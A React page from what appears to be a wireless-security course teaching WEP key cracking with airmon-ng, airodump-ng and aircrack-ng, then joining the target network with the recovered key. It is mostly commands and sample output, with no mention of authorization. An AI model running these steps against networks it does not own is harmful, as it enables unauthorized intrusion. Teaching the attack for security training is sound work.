import React from 'react';
import Terminal from '../../components/Terminal';
import InfoBox from '../../components/InfoBox';
import Diagram from '../../components/Diagram';

const WEPCrackingBasics = () => {
  return (
    <div className="page-content">
      <h1>WEP Cracking Basics — Hands-On Attack</h1>

      <p>
        Now that you understand WEP's fatal flaws, let's put theory into practice. WEP cracking 
        is a straightforward process: capture enough data packets (IVs), then run a statistical 
        attack to recover the key. The entire process can take as little as 5 minutes on an 
        active network.
      </p>

      {/* ============================================================ */}
      {/* SECTION: The Process                                         */}
      {/* ============================================================ */}
      <h2>📋 WEP Cracking — Complete Workflow</h2>

      <Diagram title="WEP Cracking Workflow">
{`
  WEP Cracking Steps:
  
  ┌──────────────────────────────────────────────────┐
  │ Step 0: Preparation                              │
  │ • Enable monitor mode                            │
  │ • Change MAC address (optional but recommended)  │
  │ • Run airodump-ng to find WEP targets            │
  └─────────────────────┬────────────────────────────┘
                        │
                        ▼
  ┌──────────────────────────────────────────────────┐
  │ Step 1: Target the WEP network                   │
  │ • Lock to the target's channel                   │
  │ • Save capture with --write                      │
  │ • Watch the #Data column grow                    │
  └─────────────────────┬────────────────────────────┘
                        │
            ┌───────────┴───────────┐
            │   Is #Data growing    │
            │   fast enough?        │
            ├───────┬───────────────┤
            │  YES  │      NO       │
            │       │  (network     │
            │       │   is idle)    │
            │       └───────┬───────┘
            │               │
            │               ▼
            │    ┌──────────────────────┐
            │    │ Step 1.5: Speed up!  │
            │    │ • Fake authentication│
            │    │ • ARP replay attack  │
            │    │ (next sections)      │
            │    └──────────┬───────────┘
            │               │
            └───────┬───────┘
                    │
                    ▼
  ┌──────────────────────────────────────────────────┐
  │ Step 2: Wait for enough IVs                      │
  │ • Minimum: ~20,000 IVs (may work)               │
  │ • Recommended: ~40,000 IVs (good chance)         │
  │ • Ideal: ~85,000 IVs (near certain)              │
  └─────────────────────┬────────────────────────────┘
                        │
                        ▼
  ┌──────────────────────────────────────────────────┐
  │ Step 3: Crack the key                            │
  │ • Run aircrack-ng on the .cap file               │
  │ • Key recovered in seconds!                      │
  └──────────────────────────────────────────────────┘
`}
      </Diagram>

      {/* ============================================================ */}
      {/* SECTION: Step by Step Commands                                */}
      {/* ============================================================ */}
      <h2>🖥️ Step-by-Step Commands</h2>

      <h3>Step 0: Preparation</h3>
      <Terminal lines={[
        { segments: [{ text: '# Kill interfering processes and enter monitor mode', type: 'comment' }] },
        { segments: [{ text: '┌──(kali㉿kali)-[~]', type: 'prompt' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo airmon-ng check kill', type: 'command' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo airmon-ng start wlan0', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Scan for WEP networks', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo airodump-ng --encrypt WEP wlan0mon', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: ' BSSID              PWR  Beacons  #Data  #/s  CH  MB   ENC   CIPHER AUTH ESSID', type: 'output' }] },
        { segments: [{ text: ' 44:55:66:DD:EE:FF  -38  200      450    45   6   54e  ', type: 'output' }, { text: 'WEP', type: 'highlight' }, { text: '  WEP         OldRouter', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Note: BSSID=44:55:66:DD:EE:FF, Channel=6, ESSID=OldRouter', type: 'comment' }] },
        { segments: [{ text: '# Press Ctrl+C to stop the scan', type: 'comment' }] },
      ]} />

      <h3>Step 1: Target and Capture</h3>
      <Terminal lines={[
        { segments: [{ text: '# Lock to the target and start capturing', type: 'comment' }] },
        { segments: [{ text: '┌──(kali㉿kali)-[~]', type: 'prompt' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo airodump-ng --bssid 44:55:66:DD:EE:FF --channel 6 --write wep_capture wlan0mon', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: ' CH  6 ][ Elapsed: 5 min ][ 2024-01-15 15:00', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: ' BSSID              PWR RXQ  Beacons  #Data  #/s  CH  MB   ENC   CIPHER AUTH ESSID', type: 'output' }] },
        { segments: [{ text: ' 44:55:66:DD:EE:FF  -38 95   1200     ', type: 'output' }, { text: '25430', type: 'highlight' }, { text: '  85   6   54e  WEP  WEP         OldRouter', type: 'output' }] },
        { segments: [{ text: '                                       ^^^^^ This is your IV count!', type: 'comment' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Keep this running! Open a NEW terminal for Step 2.', type: 'comment' }] },
      ]} />

      <InfoBox type="tip">
        <strong>The #Data column is everything!</strong> This number represents the count of data 
        packets (each containing a unique IV) that you've captured. You need this number to reach 
        at least ~25,000 for a reasonable chance of cracking.
        <ul>
          <li><strong>Active network</strong> (someone streaming/downloading): Can reach 25,000 in 5-10 minutes</li>
          <li><strong>Idle network</strong> (no one is using it): Could take hours</li>
          <li>If the network is idle, you'll need the <strong>ARP Replay</strong> attack (covered later)</li>
        </ul>
      </InfoBox>

      <h3>Step 2: Crack the Key</h3>
      <Terminal lines={[
        { segments: [{ text: '# You can run this while airodump is still capturing!', type: 'comment' }] },
        { segments: [{ text: '# aircrack-ng will automatically re-read the file as it grows', type: 'comment' }] },
        { segments: [{ text: '┌──(kali㉿kali)-[~]', type: 'prompt' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aircrack-ng wep_capture-01.cap', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '                               Aircrack-ng 1.7', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '                 [00:00:03] Tested 835 keys (got 25430 IVs)', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '                          KEY FOUND! [ ', type: 'output' }, { text: 'AB:CD:EF:12:34', type: 'highlight' }, { text: ' ]', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '      Decrypted correctly: 100%', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# 🎉 KEY FOUND! You can now connect to the network with this key!', type: 'comment' }] },
      ]} />

      <InfoBox type="note">
        <strong>What if it says "Failed" or needs more IVs?</strong> If aircrack-ng says it doesn't 
        have enough IVs, just let airodump-ng keep capturing. aircrack-ng will automatically retry 
        every 5,000 IVs (configurable). You can also run it with <code>-f 2</code> to attempt more 
        aggressively with fewer IVs (lower fudge factor).
      </InfoBox>

      <Terminal lines={[
        { segments: [{ text: '# Retry with more aggressive settings', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aircrack-ng -f 2 wep_capture-01.cap', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# -f 2 = fudge factor of 2 (default is 2, lower = more aggressive)', type: 'comment' }] },
        { segments: [{ text: '# -f 1 = most aggressive, may give false positives', type: 'comment' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Force PTW attack (faster, needs fewer IVs)', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aircrack-ng -K wep_capture-01.cap', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Force FMS/KoreK attack (needs more IVs but works in edge cases)', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aircrack-ng -z wep_capture-01.cap', type: 'command' }] },
      ]} />

      {/* ============================================================ */}
      {/* SECTION: Using the Cracked Key                               */}
      {/* ============================================================ */}
      <h2>🔓 Using the Cracked Key</h2>

      <Terminal lines={[
        { segments: [{ text: '# Stop monitor mode first', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo airmon-ng stop wlan0mon', type: 'command' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo systemctl start NetworkManager', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Connect using the cracked key', type: 'comment' }] },
        { segments: [{ text: '# Remove the colons from the key: ABCDEF1234', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'nmcli dev wifi connect OldRouter password ABCDEF1234', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Or use the GUI: NetworkManager → Select network → Enter key', type: 'comment' }] },
        { segments: [{ text: '# Key type: Select "Hex" (not ASCII/Passphrase)', type: 'comment' }] },
      ]} />

      {/* ============================================================ */}
      {/* SECTION: Edge Cases                                          */}
      {/* ============================================================ */}
      <h2>⚠️ Edge Cases & Troubleshooting</h2>

      <h3>Edge Case: Network has no active clients</h3>
      <p>
        If nobody is using the network, the #Data column stays at 0 or grows very slowly. You need 
        to generate traffic artificially using <strong>Fake Authentication</strong> + <strong>ARP 
        Replay Attack</strong> (covered in the next two sections).
      </p>

      <h3>Edge Case: Data count is high but cracking fails</h3>
      <ul>
        <li>Make sure you're targeting the right network (BSSID mismatch?)</li>
        <li>Try a different attack algorithm: <code>-K</code> (PTW) or <code>-z</code> (FMS/KoreK)</li>
        <li>Capture more IVs — sometimes you need 100,000+</li>
        <li>The .cap file might be corrupted. Start a fresh capture.</li>
      </ul>

      <h3>Edge Case: "0 IVs" even though #Data is increasing</h3>
      <p>
        aircrack-ng might report "0 IVs" if the capture file contains the wrong network or if the 
        encryption type isn't actually WEP. Verify with:
      </p>
      <Terminal lines={[
        { segments: [{ text: '# Check what aircrack-ng sees in the capture file', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'aircrack-ng wep_capture-01.cap', type: 'command' }] },
        { segments: [{ text: '# It will list all networks found in the capture', type: 'comment' }] },
        { segments: [{ text: '# Make sure the target shows as WEP, not WPA', type: 'comment' }] },
      ]} />

      <h3>Edge Case: Multiple cap files</h3>
      <Terminal lines={[
        { segments: [{ text: '# If you have multiple capture sessions, merge them:', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aircrack-ng wep_capture-01.cap wep_capture-02.cap', type: 'command' }] },
        { segments: [{ text: '# Or use wildcards:', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aircrack-ng wep_capture*.cap', type: 'command' }] },
      ]} />

      <InfoBox type="success">
        <strong>Key Takeaways:</strong>
        <ul>
          <li>WEP cracking is a 3-step process: capture IVs → accumulate enough → crack with aircrack-ng</li>
          <li>Need ~25,000-85,000 IVs for reliable cracking</li>
          <li>Active networks generate IVs naturally; idle networks need ARP replay</li>
          <li>aircrack-ng can run while airodump-ng is still capturing</li>
          <li>The cracked key works regardless of password complexity</li>
          <li>Key is displayed in hex format — remove colons when connecting</li>
        </ul>
      </InfoBox>

      <h2>📚 What's Next?</h2>
      <p>
        What if the WEP network has no active clients? The #Data counter stays at zero. In the next 
        section, we'll learn <strong>Fake Authentication</strong> — how to associate with the WEP 
        network without knowing the password, which is a prerequisite for generating traffic 
        artificially.
      </p>
    </div>
  );
};

export default WEPCrackingBasics;
